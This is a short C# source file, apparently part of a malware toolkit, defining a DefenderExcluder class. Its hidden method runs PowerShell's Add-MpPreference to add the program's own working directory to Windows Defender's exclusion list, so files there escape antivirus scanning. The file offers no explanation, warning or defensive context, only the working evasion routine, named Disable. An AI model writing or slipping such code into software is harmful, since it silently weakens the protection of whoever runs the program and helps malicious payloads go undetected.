using System.Management.Automation;
using System.IO;
using System.Collections.ObjectModel;

namespace DefenderExclusion
{
    internal class DefenderExcluder
    {
        public static void Disable()
        {
            DefenderExclusion();
        }
        private static void DefenderExclusion()
        {
            using (PowerShell PowerShell = PowerShell.Create())
            {
                string path = Directory.GetCurrentDirectory();
                PowerShell.AddScript(@"Add-MpPreference -ExclusionPath '" + path + "'");
                Collection<PSObject> PSOutput = PowerShell.Invoke();
            }
        } 
        
    }
    
}